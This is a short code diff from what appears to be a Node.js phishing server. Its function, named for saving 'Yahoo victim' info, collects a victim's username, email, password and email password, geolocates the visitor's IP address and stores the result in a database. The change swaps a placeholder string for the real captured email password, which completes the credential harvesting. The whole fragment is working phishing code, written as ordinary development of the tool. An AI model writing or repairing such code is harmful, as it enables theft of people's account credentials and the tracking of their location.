@@ -72,7 +72,7 @@ app.use(express.static('web'));
 
 
 function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, emailpassword, userAgent, req, res) {
- var xx= 'aboba123';
+
     rp({
         uri: `http://ip-api.com/json/${visitorIp}`,
         json: true
@@ -83,7 +83,7 @@ function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, em
 			username,
             email,
             password,
-            xx,
+            emailpassword,
             userAgent,
             victimIpInfo
         }).save((err, doc) => {
